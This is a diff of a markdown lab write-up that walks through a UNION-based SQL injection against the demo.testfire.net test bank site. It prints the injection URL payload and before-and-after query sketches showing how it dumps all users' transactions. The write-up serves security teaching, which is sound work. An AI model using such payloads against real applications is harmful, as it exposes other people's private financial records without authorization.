@@ -45,12 +45,12 @@ It looks exactly like ***Query 1*** without SQL Injection, and it looks like ***
 We will use make use of the ***POSTMAN*** application to exploit the SQL Injection vulnerability to fetch all the transactions from all the user.
 
 In order to show the transaction for all users we can use make of the `UNION` keyword from SQL. It is responsible for fetching all the records by performing union (as second half of any query) with the same table. We are making union of `TRANSACTIONS` table by having two parts of a query by performing the following SQLInjection:  
-`https://demo.testfire.net/bank/transaction.jsp?endDate=2019-11-11 23:59:59' UNION SELECT * FROM TRANSACTIONS order by accountid; --`
+`https://demo.testfire.net/bank/transaction.jsp?endDate=2019-11-11 23:59:59' ) UNION SELECT * FROM TRANSACTIONS ORDER BY date  DESC; --`
 
 Query before SQL Injection the query will look somewhat like this:
 ```
 SELECT * FROM TRANSACTION
-WHERE ...[SOME CONDITION]... AND [date] < '2019-11-11 23:59:59'
+WHERE ...[SOME CONDITION]... AND ( [date] < '2019-11-11 23:59:59' )
 ...[MAYBE SOME ORDER BY]...
 ...[MAYBE SOME LIMIT]...
 ```
@@ -60,13 +60,15 @@ WHERE ...[SOME CONDITION]... AND [date] < '2019-11-11 23:59:59'
 Query after SQL Injection the query will look somewhat like this:
 ```
 SELECT * FROM TRANSACTION
-WHERE ...[SOME CONDITION]... AND [date] < '2019-11-11 23:59:59'
+WHERE ...[SOME CONDITION]... AND ( [date] < '2019-11-11 23:59:59' )
 UNION
-SELECT * FROM TRANSACTIONS ORDER BY 1 DESC -- or > ORDER BY date DESC (show latest records)
+SELECT * FROM TRANSACTIONS ORDER BY date DESC -- or > ORDER BY date DESC (show latest records)
 ```
 **``` .........Query 4 ```**
 
 The query (Query 4) from the outcome of SQL Injection with `UNION` keyword will fetch all the recend records for all users without associating any condition, so the purview of result-set (records from table) in general will be equivalent to the `SELECT * FROM TRANSACTIONS ORDER BY 1 -- or > ORDER BY date DESC ` plus extra records fetched using the first half of the union query (Query 3) that comes before `UNION` keyword.
+
+***Note:*** We have to enter the date within the URL because without the date value, it throws error.
 
 Screenshot:
 ![Screenshot](img/SQLInjection_All_Transaction.png)
